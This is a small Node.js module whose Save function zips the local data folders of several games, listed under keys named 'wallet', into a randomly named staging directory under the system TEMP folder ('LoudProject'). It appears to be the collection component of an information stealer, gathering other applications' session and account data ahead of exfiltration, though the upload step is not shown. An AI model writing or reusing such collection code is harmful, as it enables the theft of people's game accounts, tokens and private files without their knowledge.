const { GamesLocalPaths } = require("../../data/paths");
const { rdm } = require("../../data/Config");
const fs = require("fs");
const AdmZip = require("adm-zip");
const path = require("path");

async function Save() {
  const baseDir = path.join(process.env.TEMP, "LoudProject", rdm, "Games");

  for (const [wallet, paths] of Object.entries(GamesLocalPaths)) {
    for (const folderPath of paths) {
      if (!fs.existsSync(folderPath)) continue;
      if (!fs.existsSync(baseDir)) fs.mkdirSync(baseDir, { recursive: true });
      const zipPath = path.join(baseDir, `${wallet}.zip`);
      const archive = new AdmZip();
      archive.addLocalFolder(folderPath);
      archive.writeZip(zipPath);
    }
  }
}

module.exports = { Save };
